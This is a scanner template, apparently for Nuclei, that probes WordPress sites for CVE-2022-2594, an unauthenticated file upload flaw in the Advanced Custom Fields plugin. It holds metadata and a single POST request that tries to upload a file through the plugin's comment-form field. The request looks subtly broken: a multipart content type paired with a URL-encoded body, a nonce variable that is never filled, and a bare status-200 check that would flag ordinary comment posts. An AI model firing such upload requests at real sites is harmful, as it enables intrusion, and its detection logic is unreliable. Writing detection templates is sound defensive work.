id: CVE-2022-2594

info:
  name: Advanced Custom Fields Unauthenticated File Upload
  author: ProjectDiscoveryAI
  severity: high
  description: The Advanced Custom Fields WordPress plugin before 5.12.3 allows unauthenticated file uploads via frontend forms.
  impact: |
    Remote code execution by unauthenticated users.
  remediation: |
    Update the Advanced Custom Fields plugin to the latest version to mitigate the vulnerability.
  reference:
    - https://wpscan.com/vulnerability/3fde5336-552c-4861-8b4d-89a16735c0e2
    - https://www.pritect.net/blog/advanced-custom-fields-5-12-3-can-allow-unauthenticated-users-to-upload-arbitrary-files
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2022-2594
    cwe-id: CWE-434
    epss-score: 0.00219
    epss-percentile: 0.60653
    cpe: cpe:2.3:a:advancedcustomfields:advanced_custom_fields:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: advancedcustomfields
    product: advanced_custom_fields
    framework: wordpress
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-comments-post.php"

    headers:
      Content-Type: multipart/form-data

    body: |
      comment=Test comment
      &_acf_post_id=1
      &_acf_validation=1
      &_acf_nonce={{nonce}}
      &_acf_changed=0
      &acf[field_62c8939d255d8]=Something
      &author=testing
      &email=testing@example.com
      &url=
      &submit=Post+Comment
      &comment_post_ID=1
      &comment_parent=0
      &acf[name]=@rickroll.mp4
    matchers:
      - type: status
        status:
          - 200
